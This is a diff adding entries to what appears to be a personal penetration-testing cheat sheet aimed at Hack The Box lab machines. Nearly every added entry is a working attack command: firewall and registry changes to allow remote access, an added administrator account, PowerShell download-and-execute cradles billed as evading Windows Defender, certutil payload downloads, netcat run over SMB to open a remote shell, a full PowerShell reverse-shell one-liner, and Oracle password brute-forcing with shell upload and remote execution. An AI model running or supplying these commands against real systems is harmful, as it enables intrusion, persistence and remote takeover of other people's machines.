@@ -101,11 +101,22 @@ type C:\Temp\\backup.zip:pass
 ######################################
 ######################################
 
-firewall_rules_change_to_accept_IP_Attacker = Cheat("Firewall Rules - PostExploit - Add Allowed IP Address")
-firewall_rules_change_to_accept_IP_Attacker.category = "Windows - PosExploit"
-firewall_rules_change_to_accept_IP_Attacker.output = """[*] Add an IP to target firewall rules to accept traffic from UDP and TCP (Need administrator privileges)
+firewall_rules_change_to_accept_IP_Attacker = Cheat("Firewall Rules - PostExploit")
+firewall_rules_change_to_accept_IP_Attacker.category = "Windows - PostExploit"
+firewall_rules_change_to_accept_IP_Attacker.output = """[*] Manage Firewall and other things
 
+# Add an IP to target firewall rules to accept traffic from UDP and TCP (Need administrator privileges) (PS)
 New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.53 -Direction inbound -Action Allow
+
+# Add permission to execute command from out of the local system (cmd)
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+# Open Ports (cmd)
+netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow
+netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow
+
+# Don't know what he do loool. But is importante... need to check...
+net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
 """
 
 ######################################
@@ -136,4 +147,103 @@ snmpwalk.category = "Tools"
 snmpwalk.output = """[*] snmpwalk - retrieve a subtree of management values using SNMP GETNEXT requests.
 
 snmpwalk -c public -v2c 10.10.10.116 > contents/snmpwalk.out
+"""
+
+######################################
+######################################
+
+ike_scan = Cheat("ike-scan - 500 UDP - IPsec VPN / ipsec - strongSwan")
+ike_scan.category = "Tools"
+ike_scan.output = """[*] ike-scan - Discover and fingerprint IKE hosts (IPsec VPN servers)
+
+# ver vídeo - HackTheBox | Conceal [OSCP Style] (TWITCH LIVE)
+# https://www.youtube.com/watch?v=RtztYLMZMe8&list=PLWys0ZbXYUy7GYspoUPPsGzCu1bdgUdzf&t=3187s
+
+ike-scan 10.10.10.116 -M
+
+# Connect to de VPN
+sudo restart ipsec
+"""
+
+######################################
+######################################
+
+file_transfere_windows_iwr = Cheat("File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe")
+file_transfere_windows_iwr.category = "Windows"
+file_transfere_windows_iwr.output = """[*] Simple file transfere for Windows with PowerShell
+
+# simple download
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.53:80/nc.exe' -OutFile 'C:\Temp\\nc.exe'"
+
+# Donwload and execute directly in RAM (Escape Windows Defender)
+powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')
+start /b C:\Windows\SysNative\WindowsPowerShell\\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"
+
+start /b C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"
+
+# Certutil.exe
+certutil -urlcache -f http://10.10.14.53:80/nc.exe C:\Temp\\nc.exe
+
+"""
+
+######################################
+######################################
+
+create_user = Cheat("Create new local user with administrator privilege")
+create_user.category = "Windows - PostExploit"
+create_user.output = """[*] Create new local user with administrator privilege...
+
+# Add a new user and assign him as Administrators group for highest local privilege
+net user javali J4val1*! /add
+net localgroup Administrators javali /add
+"""
+
+######################################
+######################################
+
+file_transfere_windows_smbserver = Cheat("File Transfere Windows - SmbServer.py (Impacket)")
+file_transfere_windows_smbserver.category = "Windows"
+file_transfere_windows_smbserver.output = """[*] Create Shared Folder by the Internet with SmbServer.py (Impacket)
+
+# On kali
+smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support
+
+# On target machine
+# Connect to SmbServer with credencial for more compatibility and less bugs
+net use \\\\10.10.14.53\smbFolder /u:javali javali
+copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\Windows\Temp\\nc64.exe
+# Execute directely without transfere
+\\\\10.10.14.53\smbFolder\\nc64.exe -e cmd 10.10.14.53 443
+"""
+
+######################################
+######################################
+
+oneline_reverse_tcp_windows = Cheat("Reverse shell TCP on Windows")
+oneline_reverse_tcp_windows.category = "Windows"
+oneline_reverse_tcp_windows.output = """[*] Simple one liner to get a reverse Shell TCP
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+"""
+
+######################################
+######################################
+
+oracle_odat = Cheat("odat - Oracle DatabaseAttacking Tools - 1521 TCP oracle-tns")
+oracle_odat.category = "Tools"
+oracle_odat.output = """[*] Powerfull tool to exploit Oracle Database
+
+# Bruteforce SID for next attacks...
+odat sidguesser -s 10.10.10.82
+
+# BruteForce default user and password in format: user/password for odat compatibility
+locate oracle | grep pass
+cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr " " "/" > passwords.txt
+sudo odat passwordguesser -s 10.10.10.82 -d <ValidSID> --accounts-file /path/to/passwords.txt
+
+# Upload a Shell
+odat utlfile -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --putFile /Temp shell.exe /path/to/shell.exe --sysdba
+
+# RCE
+odat externaltable -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --exec /Temp shell.exe --sysdba
 """
